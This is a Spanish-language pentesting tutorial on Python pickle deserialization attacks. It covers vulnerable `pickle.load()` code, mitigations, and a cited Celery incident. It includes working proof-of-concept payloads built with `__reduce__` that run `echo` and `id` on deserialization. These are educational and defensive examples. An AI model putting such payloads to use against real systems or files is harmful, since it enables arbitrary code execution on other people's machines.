
---
# Python – Ataque de Deserialización Pickle (DES-Pickle)

## ¿Qué es un Ataque de Deserialización Pickle?

Un **Ataque de Deserialización Pickle (DES-Pickle)** ocurre cuando una aplicación en Python utiliza la biblioteca `pickle` para deserializar datos que pueden ser manipulados por un atacante.

Pickle es una biblioteca estándar de Python usada para serializar y deserializar objetos. Sin embargo, su gran poder es también su gran riesgo: permite la reconstrucción de objetos arbitrarios, incluidas funciones y clases, lo que puede derivar en ejecución remota de código si se usa con datos no confiables.

## ¿Cómo se explota?

Cuando un atacante puede controlar o modificar el contenido serializado (`pickle`), puede inyectar instrucciones que se ejecutan al momento de deserializar. Esto se debe a que `pickle.load()` ejecuta directamente los métodos definidos en la representación del objeto, como `__reduce__()` o `__setstate__()`.

### Código vulnerable:

```python
import pickle

with open("entrada.pkl", "rb") as f:
    datos = pickle.load(f)  # ¡Vulnerable!
````

Si el archivo `entrada.pkl` fue manipulado, podría contener código malicioso que se ejecutará automáticamente.

---

## Ejemplo de payload malicioso

### Generación del payload:

```python
import pickle
import os

class Pwn:
    def __reduce__(self):
        return (os.system, ("echo Pwned con Pickle",))

with open("payload.pkl", "wb") as f:
    pickle.dump(Pwn(), f)
```

Este payload ejecuta `echo Pwned con Pickle` cuando se deserializa.

### Código que deserializa y ejecuta el payload:

```python
import pickle

with open("payload.pkl", "rb") as f:
    obj = pickle.load(f)
```

Cuando `pickle.load(f)` se ejecuta, el sistema lanza el comando especificado, demostrando ejecución remota de código.

---

## Riesgos

- **Ejecución remota de código (RCE)**.
    
- **Robo de información sensible**.
    
- **Alteración del comportamiento de la aplicación**.
    
- **Denegación de servicio (DoS)**.
    
- **Escalada de privilegios si la app corre como root**.
    

---

## Mitigaciones

- **No utilizar Pickle con entradas de usuarios no confiables**.
    
- Preferir formatos seguros como **JSON** o **YAML con `safe_load()`**.
    
- Si se debe usar Pickle, aplicar controles previos a la deserialización (hashes, firmar los datos, validación estricta).
    
- Ejecutar deserialización en entornos aislados (sandbox).
    
- Auditar el uso de `pickle.load()` en proyectos.
    

---

## Caso práctico

Archivo `payload.pkl` generado por un atacante:

```python
import pickle
import subprocess

class Exploit:
    def __reduce__(self):
        return (subprocess.check_output, (["id"],))

pickle.dump(Exploit(), open("exploit.pkl", "wb"))
```

El atacante entrega `exploit.pkl` a una app vulnerable. Al deserializarlo:

```python
import pickle

data = pickle.load(open("exploit.pkl", "rb"))
print(data.decode())
```

La aplicación imprime la salida del comando `id`, demostrando la ejecución de código en el sistema.

---

## Caso real

En 2011, el sistema de mensajería de Python llamado Celery contenía un endpoint que aceptaba objetos serializados en Pickle. Un investigador demostró que podía enviar un objeto modificado que, al deserializarse, ejecutaba comandos arbitrarios en los servidores, logrando una shell remota. El problema fue corregido migrando a JSON y añadiendo firmas digitales a los mensajes.

---

## Conclusión

Las funciones de deserialización como `pickle.load()` deben ser usadas con extrema precaución. Si una aplicación procesa objetos Pickle que provienen de usuarios o fuentes externas, debe considerarse vulnerable. Como pentesters, debemos buscar endpoints o funciones que cargan archivos `.pkl`, cadenas codificadas en base64 o estructuras serializadas para verificar vectores de ejecución de código.

---
